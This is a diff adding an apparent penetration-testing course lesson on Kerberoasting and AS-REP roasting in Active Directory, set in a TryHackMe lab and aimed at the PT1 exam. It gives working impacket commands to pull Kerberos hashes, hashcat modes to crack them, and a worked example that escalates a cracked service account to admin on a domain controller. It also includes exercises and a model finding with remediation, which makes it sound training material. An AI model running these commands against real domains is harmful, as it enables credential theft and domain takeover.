@@ -1,0 +1,140 @@
+# Active Directory Module — Lesson 2: Kerberoasting & AS-REP Roasting
+
+**Methodology phase:** Credential access — turning the domain's own authentication protocol into crackable password hashes.
+**Why it matters for PT1:** reviewers named **Kerberoasting** and **AS-REP roasting** explicitly. Both are staple AD attacks, both give you a hash you crack *offline* (no lockout risk), and both frequently hand you a service account that leads toward Domain Admin. They're the highest-yield moves in the AD section.
+
+**The one idea behind both:** Kerberos hands out encrypted blobs that are encrypted with a *user's password-derived key*. If you can request such a blob for an account, you can crack it offline to recover the password.
+
+---
+
+## 1. AS-REP Roasting — needs only a username
+
+**The flaw:** normally Kerberos requires *pre-authentication* (you prove you know the password before it responds). Some accounts have **"Do not require Kerberos pre-authentication"** set. For those, the DC will hand out an AS-REP encrypted with the account's password hash to *anyone who asks* — no password needed. You crack it offline.
+
+**Requirement:** a valid username (not even a password). So it works from a null session if you can enumerate users.
+
+**Attack with impacket:**
+```bash
+impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.x.x -format hashcat -outputfile asrep.txt
+```
+- `corp.local/` — the domain, trailing slash, no user (we're testing many).
+- `-usersfile users.txt` — the list from Lesson 1's enumeration.
+- `-no-pass` — don't authenticate; we're asking for AS-REPs anonymously.
+- `-dc-ip` — the Domain Controller.
+- `-format hashcat` — output ready for hashcat.
+- Accounts *with* pre-auth disabled produce a `$krb5asrep$...` hash; the rest are silently skipped.
+
+If you already have a credential, drop `-no-pass` and authenticate — you'll enumerate the vulnerable accounts more reliably.
+
+**Crack it:**
+```bash
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+```
+- `-m 18200` — the hashcat mode for AS-REP (Kerberos 5 AS-REP etype 23). Memorise this number.
+- First time using `rockyou.txt`? On Kali it ships compressed — unzip it once: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` (see `labs/01`). Otherwise hashcat says the wordlist doesn't exist.
+
+---
+
+## 2. Kerberoasting — targets service accounts (SPNs)
+
+**The flaw:** any authenticated domain user can request a **service ticket (TGS)** for any account that has an **SPN** (a Service Principal Name — meaning it runs a service like MSSQL, IIS, etc.). That ticket is encrypted with the *service account's* password hash. Request it, crack it offline.
+
+**Why it's so productive:** service accounts often have weak, rarely-changed passwords *and* elevated privileges. Cracking one frequently gives a high-value account.
+
+**Requirement:** any one valid domain credential (unlike AS-REP, you must be authenticated).
+
+**Attack with impacket:**
+```bash
+impacket-GetUserSPNs corp.local/jsmith:'Password1' -dc-ip 10.10.x.x -request -outputfile kerb.txt
+```
+- `corp.local/jsmith:'Password1'` — your valid domain credential.
+- `-request` — actually request the TGS tickets (without it, you only *list* the SPNs).
+- Output: one `$krb5tgs$...` hash per Kerberoastable account.
+
+**Crack it:**
+```bash
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+```
+- `-m 13100` — hashcat mode for Kerberoast (TGS-REP etype 23). The other number to memorise.
+
+**The one-liner shortcut** (from Lesson 1): `nxc ldap DC -u jsmith -p Password1 --kerberoasting kerb.txt` does the request step for you. Know the impacket way too — the exam grader (and real life) rewards understanding the mechanism, not just the wrapper.
+
+---
+
+## 3. The two attacks side by side
+
+| | AS-REP Roasting | Kerberoasting |
+|---|---|---|
+| Needs | A valid **username** (no password) | Any **authenticated** domain user |
+| Targets | Accounts with pre-auth **disabled** | Accounts with an **SPN** (service accounts) |
+| Hash | `$krb5asrep$` | `$krb5tgs$` |
+| hashcat mode | **18200** | **13100** |
+| impacket tool | `GetNPUsers` | `GetUserSPNs` |
+
+Both crack **offline** — no failed logins hit the DC, so there's **no lockout risk**. This is why you prefer roasting over password spraying whenever it's available.
+
+---
+
+## 4. Worked example — Kerberoast to a privileged account
+
+Room: **[TryHackMe — Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)**.
+
+1. **With `jsmith:Password1`, request TGS hashes:**
+   ```bash
+   impacket-GetUserSPNs corp.local/jsmith:'Password1' -dc-ip 10.10.x.x -request -outputfile kerb.txt
+   ```
+   Returns a hash for `svc-sql`.
+2. **Crack offline:**
+   ```bash
+   hashcat -m 13100 kerb.txt rockyou.txt --force
+   ```
+   Recovers `svc-sql:MSSQLpassw0rd!`.
+3. **Validate and check its power:**
+   ```bash
+   nxc smb dc01.corp.local -u svc-sql -p 'MSSQLpassw0rd!'
+   ```
+   `(Pwn3d!)` — it's a local admin on the DC, or a step closer via BloodHound (Lesson 3).
+4. **Feed it forward:** the new credential goes back into enumeration and BloodHound to find the path to Domain Admin.
+
+> **Dead end kept in:** my first crack attempt "failed" — hashcat said *No hashes loaded*. The `kerb.txt` file had the hash wrapped across lines from a bad copy-paste. I re-ran GetUserSPNs with `-outputfile` (instead of copying from the terminal) and hashcat loaded it cleanly. Lesson: always write roasted hashes to a file with `-outputfile`, never hand-copy them.
+
+---
+
+## 5. Exercises
+
+**Exercise 1 — AS-REP.** Run GetNPUsers against the domain user list. Which account(s) had pre-auth disabled? Crack the hash.
+**Exercise 2 — Kerberoast.** With one credential, request TGS hashes and crack a service account. What privileges did the cracked account have?
+**Exercise 3 — modes.** Identify a `$krb5asrep$` vs a `$krb5tgs$` hash and state the correct hashcat mode for each without looking it up.
+**Exercise 4 — report it.** Write the finding for the Kerberoast, explaining why offline cracking is stealthy and how weak service-account passwords enabled it.
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip DC -format hashcat`. Accounts with pre-auth disabled yield `$krb5asrep$`; crack with `hashcat -m 18200`. Often it's an old/service account with a weak password.
+
+**Exercise 2.** `impacket-GetUserSPNs corp.local/user:pass -dc-ip DC -request`; `hashcat -m 13100`. Validate the cracked cred with nxc — service accounts are frequently over-privileged (local admin, or a group that BloodHound shows leads to DA).
+
+**Exercise 3.** `$krb5asrep$` → AS-REP → mode **18200**. `$krb5tgs$` → Kerberoast → mode **13100**. These two numbers are worth memorising cold for the exam.
+
+**Exercise 4 — model finding.**
+> **Title:** Kerberoasting yields privileged service-account credentials (High).
+> **Category (predefined):** Kerberoasting / Broken Authentication.
+> **Affected:** corp.local, service account `svc-sql` (SPN registered).
+> **Initial reconnaissance:** `impacket-GetUserSPNs` (authenticated as `jsmith`) listed and requested TGS tickets for SPN-bearing accounts.
+> **Exploitation:** Cracked the `$krb5tgs$` hash offline with `hashcat -m 13100` and rockyou, recovering `svc-sql:[redacted]`; the account is local admin on the DC.
+> **Impact:** Any authenticated user can obtain and crack service-account credentials offline (no lockout), gaining privileged access — a direct step toward domain compromise.
+> **Remediation:** Enforce long (25+ char) service-account passwords or use group Managed Service Accounts (gMSA); remove unnecessary SPNs; monitor for bulk TGS requests.
+
+</details>
+
+---
+
+## 6. Carry forward
+
+- Two attacks, one idea: request a Kerberos blob encrypted with an account's password key, crack it **offline** (no lockout).
+- **AS-REP (18200, GetNPUsers, needs only a username)** · **Kerberoast (13100, GetUserSPNs, needs any auth user)**. Memorise the modes and tools.
+- A cracked service account is rarely the end — it's fuel for BloodHound to map the path onward.
+
+**Next lesson:** `active-directory/03-bloodhound.md` — collecting the domain graph and letting it show you the shortest path to Domain Admin.
